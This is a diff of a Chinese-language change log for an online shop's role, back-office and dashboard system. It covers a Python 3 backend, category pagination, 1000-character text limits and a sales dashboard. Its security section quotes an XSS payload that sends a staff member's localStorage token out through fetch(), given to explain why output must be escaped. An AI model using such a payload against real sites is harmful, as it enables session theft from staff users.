@@ -1,10 +1,11 @@
 # 角色權限與後台系統 — 改動說明
 
 > 本文件記錄從「單一 admin 角色」演進到「六角色 + 訂單履約流程」的完整改動。
-> 累積六輪，摘要見 [第 11 節：變更歷程](#11-變更歷程)。
+> 累積十三輪，摘要見 [第 11 節：變更歷程](#11-變更歷程)。
 >
 > **目前狀態**：六種角色、統一登入入口、訂單履約與付款狀態分流、
-> 財務／倉管／物流三支營運後台、權杖撤銷、帳號停用。
+> 財務／倉管／物流三支營運後台、權杖撤銷、帳號停用、
+> 🆕 Python 3 版後端（`py3/`）、顧客商城分類目錄與分頁、文字欄位 1000 字上限、銷售分析 Dashboard。
 
 ---
 
@@ -33,16 +34,19 @@
 | [warehouse.html](warehouse.html) | 🆕 | 倉庫管理（倉管） |
 | [logistics.html](logistics.html) | 🆕 | 物流管理（物流） |
 | [ops.js](ops.js) | 🆕 | 上面三支頁面共用的工作佇列邏輯 |
-| [MariaDB.sql](MariaDB.sql) | 改寫 | 全新安裝用結構（11 張表） |
+| [dashboard.html](dashboard.html) | 🆕 | **銷售分析 Dashboard**（manager / admin / finance）—— 年、季、月、日、區間五種分析 |
+| [dashboard.js](dashboard.js) | 🆕 | Dashboard 邏輯與圖表（原生 SVG，不依賴外部函式庫） |
+| [py3/](py3/) | 🆕 | **Python 3 版後端** `api.py`（Flask + PyMySQL）與配合修改的網頁，說明見 [py3/README-py3.md](py3/README-py3.md) |
+| [MariaDB.sql](MariaDB.sql) | 改寫 | 全新安裝用結構（11 張表）；🆕 四個 `TEXT` 欄位改為 `VARCHAR(1000)` |
 | [MariaDB-migration.sql](MariaDB-migration.sql) | 🆕 | 既有資料庫升級腳本，**冪等**、不刪資料 |
 | [MariaDB-seed-accounts.sql](MariaDB-seed-accounts.sql) | 🆕 | 重設／建立六個測試帳號的密碼（**會覆寫**，故與 migration 分開） |
-| [api.php](api.php) | 改寫 | 角色權限、後台端點、聊天室成員驗證 |
+| [api.php](api.php) | 改寫 | 角色權限、後台端點、聊天室成員驗證；🆕 分類目錄分頁、文字長度檢查、`staff-dashboard` |
 | [App.js](App.js) | 修改 | 客服專屬房間、登出撤銷權杖、庫存顯示、支付方式選擇、履約狀態標籤、金額千分位；🆕 同一份程式碼另出 iOS 版 |
-| [admin.html](admin.html) | 改寫 | 登入閘門（限 admin）＋ 五大功能 |
-| [manager.html](manager.html) | 🆕 | 登入閘門（限 manager）＋ 五大功能 |
+| [admin.html](admin.html) | 改寫 | 登入閘門（限 admin）＋ 五大功能；🆕 側欄有 Dashboard 入口 |
+| [manager.html](manager.html) | 🆕 | 登入閘門（限 manager）＋ 五大功能；🆕 側欄有 Dashboard 入口 |
 | [backoffice.css](backoffice.css) | 🆕 | **五支**後台頁面共用樣式 |
 | [backoffice.js](backoffice.js) | 🆕 | admin / manager 共用邏輯（含金額千分位 `money()`） |
-| [index.html](index.html) | 改寫 | 顧客前台補上登入與權杖、金額千分位 |
+| [index.html](index.html) | 改寫 | 顧客前台補上登入與權杖、金額千分位；🆕 商品目錄改為「先分類、再商品」兩層，各自每頁 20 筆 |
 
 > **為什麼後台頁面要共用 CSS / JS？**
 > 五支後台頁面分成兩組，各組內部畫面與功能相同，差別只在「允許進入的角色」：
@@ -150,6 +154,7 @@ if (($user['status'] ?? 'active') !== 'active') {
 | `Chat_Rooms.admin_id` | 改名為 `manager_id` —— 客服對話是「customer ↔ manager」 |
 | `Cart` 唯一鍵 | `UNIQUE (user_id, product_id)` —— 加入購物車的邏輯本來就是「找到就累加」 |
 | `Revoked_Tokens` | 🆕 權杖黑名單（見 [第 9 節](#9-權杖撤銷revoked_tokens)） |
+| `Categories.description`、`Products.description`、`Reviews.comment`、`Messages.message_text` | 🆕 `TEXT` → `VARCHAR(1000)`（`message_text` 保留 `NOT NULL`），見 [3-4](#3-4-文字欄位長度上限-) |
 
 ### 3-2. 資料遷移（migration 會自動處理）
 
@@ -169,6 +174,31 @@ if (($user['status'] ?? 'active') !== 'active') {
 | `idx_chatrooms_customer` / `idx_chatrooms_manager` | 「這位客戶的房」「還沒人認領的房」兩種掃描 |
 | `idx_revoked_expires` | 清理過期黑名單 |
 | `idx_messages_room` | 客服輪詢每 2 秒掃一次訊息 |
+
+### 3-4. 文字欄位長度上限 🆕
+
+四個原本是 `TEXT` 的欄位改為 `VARCHAR(1000)`。資料庫是 utf8mb4，1000 指的是**字數**，中文一字算一字。
+長度在三層都擋，而且上限一致：
+
+| 層 | 做法 | 超過時 |
+| --- | --- | --- |
+| 資料庫 | `VARCHAR(1000)`（嚴格模式） | 寫入失敗（1406 Data too long） |
+| API | `check_text_len()`，套在評價、訊息、分類說明、商品說明的 7 個寫入點 | 回 **400**：「評價內容最多 1000 字（目前 1001 字）」，附 `code: "TEXT_TOO_LONG"` |
+| 前端 | 輸入框 `maxlength="1000"`（網頁）、`maxLength={1000}`（App） | 打字時就打不下去，貼上也會被截斷 |
+
+> 沒有 API 這一層的話，資料庫錯誤會原封不動以 500 回傳，前端只看到一串 SQL 訊息。
+>
+> 瀏覽器與 App 的上限以 UTF-16 計算，一個 emoji 算 2 字，所以輸入框對 emoji 比後端嚴格（不會讓超長內容送出去）。
+
+**既有資料庫**：[MariaDB-migration.sql](MariaDB-migration.sql) 第 7-1 步負責轉換，同樣是冪等的：
+
+| 情況 | 結果 |
+| --- | --- |
+| 欄位已是 `varchar(1000)` | 略過 |
+| 既有資料有超過 1000 字的列 | **不修改該欄位**，顯示「⚠️ 有 N 筆超過 1000 字，未修改」，其餘欄位照常轉換 |
+| 其餘 | `ALTER TABLE ... MODIFY` |
+
+遇到警告時先人工處理那幾筆（縮短或搬走），再重跑 migration 即可。
 
 ---
 
@@ -198,7 +228,7 @@ C:\xampp\mysql\bin\mysql.exe -h 192.168.8.88 -u admin -p shop_db < MariaDB-migra
 
 ### 4-2. 上傳檔案到伺服器
 
-`api.php` 與七支網頁要放在同一個目錄（例如 `192.168.8.88` 的網站根目錄）：
+`api.php` 與八支網頁要放在同一個目錄（例如 `192.168.8.88` 的網站根目錄）：
 
 ```
 api.php
@@ -210,6 +240,8 @@ manager.html        ← 營運人員後台
 finance.html        ← 訂單帳款管理（財務）
 warehouse.html      ← 倉庫管理（倉管）
 logistics.html      ← 物流管理（物流）
+dashboard.html      ← 🆕 銷售分析 Dashboard（manager / admin / finance）
+dashboard.js        ← 🆕 Dashboard 邏輯與圖表
 backoffice.css      ← 全部後台頁面共用樣式
 backoffice.js       ← admin / manager 共用邏輯
 ops.js              ← finance / warehouse / logistics 共用邏輯
@@ -269,11 +301,28 @@ $db_name  = $config['db_name']  ?? $config['dbname'] ?? 'shop_db';
 $username = $config['username'] ?? $config['user']   ?? 'root';
 ```
 
+### 4-4. Python 3 版後端（可選）🆕
+
+`py3/` 目錄是同一套系統的 Python 3 版：`api.py`（Flask + PyMySQL + bcrypt）取代 `api.php`，
+網頁檔案已改好 API 預設位址（`api`）。兩版接同一個資料庫、權杖與密碼雜湊互通，可以並存。
+
+```bash
+cd py3
+pip install -r requirements.txt
+python api.py            # 預設 http://0.0.0.0:5000，網頁與 API 同源
+```
+
+設定檔沿用上一層的 `db.ini`（也可放一份在 `py3/` 或用環境變數 `DB_INI` 指定）。
+完整說明見 [py3/README-py3.md](py3/README-py3.md)。
+
+> 兩版以同一份初始資料庫跑 127 個操作步驟逐筆比對，回應完全一致；
+> 之後每一輪的新功能（分類目錄、文字長度、Dashboard）也都兩版同步並比對過。
+
 ---
 
 ## 5. 後台頁面
 
-後台共五支，分成兩組。
+後台共五支，分成兩組；另有一支跨角色的 🆕 [銷售分析 Dashboard](#5-3-銷售分析-dashboard-)。
 
 ### 5-1. 綜合後台（admin / manager）
 
@@ -286,6 +335,7 @@ $username = $config['username'] ?? $config['user']   ?? 'root';
 | 📜 訂單與支付流水 | ✅ 分頁 + 改狀態 + 展開明細 | ✅ 同左 |
 | 👥 會員帳戶清單 | ✅ 可調整角色、**停用 / 重啟帳號** | 唯讀（後端擋 403） |
 | 💬 客服即時通訊中心 | 看得到**所有**聊天室 | 只看「未認領 + 自己認領」 |
+| 📊 銷售分析 Dashboard 🆕 | ✅ 側欄連到 `dashboard.html` | ✅ 同左 |
 
 ### 5-2. 營運後台（finance / warehouse / logistics）
 
@@ -306,6 +356,45 @@ $username = $config['username'] ?? $config['user']   ?? 'root';
   貨到付款屬正常情形，但若是 ATM 轉帳應先與財務確認。
 * 物流頁對**貨到付款**訂單提醒向客戶收現，並通知財務登錄。
 * 三支頁面都可展開訂單完整明細（主檔 + 商品 + 付款）。
+
+### 5-3. 銷售分析 Dashboard 🆕
+
+[dashboard.html](dashboard.html) + [dashboard.js](dashboard.js)，限 **manager / admin / finance**。
+admin、manager、finance 三支頁面的側欄都有「📊 銷售分析 Dashboard」入口；
+Dashboard 側欄的「↩ 返回後台」會回到該角色自己的頁面（`me.home`）。
+
+**「銷售」的定義**：期間內成立、且**未取消**的訂單（舊制 `pending` / `paid` 也算）。取消的訂單另列一格 KPI。
+
+| 分析 | 篩選條件 | X 軸 |
+| --- | --- | --- |
+| 年銷售 | 起始年～結束年（預設近 5 年） | 每年 |
+| 季銷售 | 年度 | Q1～Q4 |
+| 月銷售 | 年度（開頁預設今年） | 1～12 月 |
+| 日銷售 | 月份 | 當月每一天 |
+| 區間銷售 | 起訖日 + 快速選擇（近 7／30／90 天、本月、今年）+ 統計單位 | 依統計單位 |
+
+區間銷售的統計單位選「自動」時：92 天以內依日、2 年以內依月、10 年以內依季，再長依年。
+
+每種分析都有：
+
+| 區塊 | 內容 |
+| --- | --- |
+| KPI | 銷售額、訂單數、銷售件數、平均客單價、已收款（含占比）、已取消（筆數與金額） |
+| 長條圖 | 各時段銷售額；只標最高的一根，滑鼠移上去看金額、訂單數、件數 |
+| 曲線圖 | 訂單數與銷售件數兩條線，滑鼠移上去有對齊線與數值 |
+| 圓餅圖 | 銷售額占比，可切換「依期間／依商品分類／依支付方式」；最多 6 塊，其餘併成「其他」 |
+| 表格 | 熱銷商品 Top 10、期間明細（每個時段的數字 + 合計） |
+
+設計上的取捨：
+
+* **時段由前端補 0**：後端只回有訂單的時段，前端依起訖日與統計單位補齊，X 軸才連續。
+* **未到來的時段不畫成 0**：例如今天看今年的 11、12 月，曲線只畫到今天，明細表也不列。
+* **時段超過 6 個時不提供「依期間」圓餅圖**（例如 12 個月），切太碎讀不出來，請看長條圖。
+* **圖表用原生 SVG 自己畫**：後台常架在內網，若依賴 CDN 上的圖表函式庫，連不上外網時整頁圖表都會消失。
+* **色票經過驗證**：六個類別色依固定順序指派，已檢查色盲辨識度；淺色系對比較低，所以圓餅圖旁一律附文字標籤與數值表。
+* 只有淺色版，與其他後台頁一致。
+
+API 見 [第 8 節](#8-api-端點與權限總表) 的 `staff-dashboard`。
 
 ### 統一登入與角色導向 🆕
 
@@ -610,6 +699,24 @@ if ($status === 'cancelled') {
 
 整段包在事務裡，且已取消的訂單不能再改狀態（回 409）。
 
+### 顧客商城的分類目錄與分頁 🆕
+
+顧客登入 [index.html](index.html) 後，商品目錄先依 `category_id` 列出**分類**，點分類才列出該分類的**商品**；
+兩層都是每頁 20 筆。上方導覽列「‹ 全部分類 / 分類名稱」可返回，按「🔄 重新整理」或結帳後會重抓**目前所在的那一層與那一頁**。
+
+為了不影響既有呼叫者，新功能都是**帶參數才啟用**：
+
+| 請求 | 回應 | 使用者 |
+| --- | --- | --- |
+| `GET /categories` | 完整分類陣列（不變） | 後台商品表單的分類選單、App |
+| `GET /categories?page=N` 🆕 | 分頁信封 `{page, per_page, total, total_pages, data}`，每筆多一個 `product_count` | index.html |
+| `GET /products?page=N` | 純陣列（不變） | App 的無限滾動 |
+| `GET /products?category_id=C&page=N` 🆕 | 該分類商品的分頁信封，新上架的在前 | index.html |
+
+分類被刪除後商品的 `category_id` 會變成 NULL（`ON DELETE SET NULL`），這些商品在新的分類目錄裡就找不到了。
+所以有這類商品時，分類目錄最後會多一個虛擬分類「**未分類**」（`category_id = 0`），
+`/products?category_id=0` 列出 `category_id IS NULL` 的商品。
+
 ---
 
 ## 8. API 端點與權限總表
@@ -620,8 +727,8 @@ if ($status === 'cancelled') {
 | `/users?action=logout` | POST | 🔒 登入 | 🆕 把權杖寫進黑名單 |
 | `/users` | POST | 公開 | 註冊（role 一律寫死 `customer`） |
 | `/users` | GET | 🔒 登入 | 只能讀**自己**的資料；含 🆕 `home` 供各頁守門用 |
-| `/categories` | GET | 公開 | 分類列 + 後台 listbox 來源 |
-| `/products` | GET | 公開 | 前台商品目錄（每頁 20 筆） |
+| `/categories` | GET | 公開 | 分類列 + 後台 listbox 來源；🆕 帶 `?page=N` 回分頁信封（含 `product_count`） |
+| `/products` | GET | 公開 | 前台商品目錄（每頁 20 筆）；🆕 帶 `?category_id=C` 回該分類的分頁信封 |
 | `/cart` | GET/POST/PUT/DELETE | 🔒 登入 | 身分來自權杖 |
 | `/orders` | POST | 🔒 登入 | 結帳；金額由後端算 |
 | `/orders` | GET | 🔒 登入 | 不帶參數 → 自己的訂單列表 |
@@ -629,11 +736,11 @@ if ($status === 'cancelled') {
 | `/order-items` | GET | 🔒 登入 | 客戶限自己的；五種後台角色可看任一張 |
 | `/payments` | POST | 🔒 登入 | 金額讀 `Orders.total_amount`；🆕 `payment_method` 白名單 + 狀態分流 |
 | `/reviews` | GET | 公開 | 評價是公開資訊 |
-| `/reviews` | POST | 🔒 登入 | 作者來自權杖 |
+| `/reviews` | POST | 🔒 登入 | 作者來自權杖；🆕 `comment` 最多 1000 字 |
 | `/chat-rooms` | POST | 🔒 customer | 取得或建立自己的房 |
 | `/chat-rooms` | GET | 🔒 登入 | 依角色過濾（見第 6 節） |
 | `/chat-rooms` | PUT | 🔒 manager+admin | 認領 / 結案（刻意不含三個營運角色 —— 客服不是他們的職責） |
-| `/messages` | GET/POST | 🔒 成員 | 每次都驗成員資格 |
+| `/messages` | GET/POST | 🔒 成員 | 每次都驗成員資格；🆕 `message_text` 最多 1000 字 |
 | 🆕 `/staff-categories` | GET/POST/PUT/DELETE | 🔒 manager+admin | 分類管理 |
 | 🆕 `/staff-products` | GET/POST/PUT/DELETE | 🔒 manager+admin | 商品管理（分頁） |
 | 🆕 `/staff-orders?scope=` | GET | 🔒 五種後台角色 | 訂單流水（分頁，最早在前）。`scope` 可為 `finance` / `warehouse` / `logistics`，省略則列全部 |
@@ -641,6 +748,12 @@ if ($status === 'cancelled') {
 | 🆕 `/staff-payments` | PUT | 🔒 finance / manager / admin | 確認收款：付款紀錄 `pending` → `success` |
 | 🆕 `/staff-users` | GET | 🔒 manager+admin | 會員清單（分頁） |
 | 🆕 `/staff-users` | PUT | 🔒 **admin only** | 調整會員角色（六種）、停用 / 重啟帳號 |
+| 🆕 `/staff-dashboard` | GET | 🔒 manager / admin / finance | 銷售分析。參數 `from`、`to`（`YYYY-MM-DD`）、`group`（`day` / `month` / `quarter` / `year`，預設 `month`）。回傳 `summary`、`series`、`by_category`、`by_payment`、`top_products`、`bounds` |
+
+> `staff-categories` 與 `staff-products` 的 `description` 也是 🆕 最多 1000 字，超過一律回 400 + `code: "TEXT_TOO_LONG"`。
+>
+> `staff-dashboard` 的檢查：日期格式錯誤或日期不存在（如 2 月 30 日）、起始晚於結束、`group` 不在清單內都回 400；
+> 依日統計的區間最多 366 天。
 
 ### 命名規則
 
@@ -656,6 +769,7 @@ if ($status === 'cancelled') {
 | 總管功能 | `staff-products`、`staff-categories`、`staff-users` GET | manager、admin |
 | 訂單作業 | `staff-orders` GET / PUT、`/orders?order_id=` GET、`/order-items` GET | manager、admin、finance、warehouse、logistics（PUT 再依 `order_transition_rules()` 分流） |
 | 帳款 | `staff-payments` PUT | finance、manager、admin |
+| 銷售分析 🆕 | `staff-dashboard` GET | manager、admin、finance |
 | 最高權限 | `staff-users` PUT | **admin only** |
 
 ### 後台角色清單只定義一次：`BACKOFFICE_ROLES` 🆕
@@ -759,6 +873,8 @@ DELETE FROM Revoked_Tokens WHERE expires_at < NOW();
 | 資料庫結構不符 | 全域例外攔截把未捕捉的 DB 錯誤轉成 JSON，並提示「請執行 MariaDB-migration.sql」 |
 | 權限兩層不一致 🆕 | 端點層與資料列層共用 `BACKOFFICE_ROLES`，新增角色只改一處（見第 8 節） |
 | 機密外洩到建置雲端 🆕 | 手機 iOS 版走 EAS 雲端建置，`.easignore` 排除 `db.ini`、`api.php`、SQL；`db.ini` 也補進 `.gitignore` |
+| 超長文字 🆕 | 資料庫 `VARCHAR(1000)` + API 回 400 + 前端輸入框上限，三層一致（見 [3-4](#3-4-文字欄位長度上限-)） |
+| Python 版不外洩設定 🆕 | `api.py` 兼任網頁伺服器，但只開放 .html / .css / .js / 圖片；`/db.ini` 與 `.py` 原始碼回 404 |
 
 > **XSS 這點值得特別說**：後台會把客戶的聊天訊息、商品名稱、會員姓名塞進 `innerHTML`。
 > 沒跳脫的話，客戶只要在客服對話打一段 `<img src=x onerror="fetch('...'+localStorage.shop_token)">`，
@@ -824,6 +940,24 @@ DELETE FROM Revoked_Tokens WHERE expires_at < NOW();
 後端不用改；但 iOS 17 起 ATS 預設擋 IP 位址，`app.json` 已為內網 IP 設例外。
 詳見 [README-打包APK.md 第十節](README-打包APK.md)。
 
+### 第 10 輪 — Python 3 版後端
+`api.php` 改寫為 `py3/api.py`（Flask + PyMySQL + bcrypt），資料庫結構不動。
+回應格式（價格為字串、時間 `Y-m-d H:i:s`）、權杖算法、bcrypt 雜湊都與 PHP 版相容，兩版可並存。
+網頁的 API 預設位址改為 `api`，`/api.php/…` 保留為相容別名。詳見 [py3/README-py3.md](py3/README-py3.md)。
+
+### 第 11 輪 — 顧客商城分類目錄與分頁
+`index.html` 的商品目錄改成「先分類、再商品」兩層，各自每頁 20 筆；
+`/categories?page=N`、`/products?category_id=C` 帶參數才啟用，舊呼叫方式不受影響。
+分類被刪掉的商品收進虛擬分類「未分類」（見 [第 7 節末](#顧客商城的分類目錄與分頁-)）。
+
+### 第 12 輪 — 文字欄位 1000 字上限
+四個 `TEXT` 欄位改為 `VARCHAR(1000)`；API 與前端輸入框同步擋在 1000 字；
+`MariaDB-migration.sql` 新增第 7-1 步，遇到既有超長資料會略過該欄位並警告（見 [3-4](#3-4-文字欄位長度上限-)）。
+
+### 第 13 輪 — 銷售分析 Dashboard
+新增 `dashboard.html` / `dashboard.js` 與 `staff-dashboard` 端點，限 manager / admin / finance。
+年、季、月、日、區間五種分析，每種都有 KPI、長條圖、曲線圖、圓餅圖與明細表（見 [5-3](#5-3-銷售分析-dashboard-)）。
+
 ---
 
 ### 相關文件
@@ -831,3 +965,4 @@ DELETE FROM Revoked_Tokens WHERE expires_at < NOW();
 - [App.js-說明文件.md](App.js-說明文件.md) —— 手機 App 端的完整說明
 - [README-打包APK.md](README-打包APK.md) —— Android APK 與 iOS（EAS 雲端建置）打包流程
 - [README-改寫說明.md](README-改寫說明.md) —— 舊語法 → 新版本的改寫紀錄
+- [py3/README-py3.md](py3/README-py3.md) —— Python 3 版後端的啟動與相容性說明
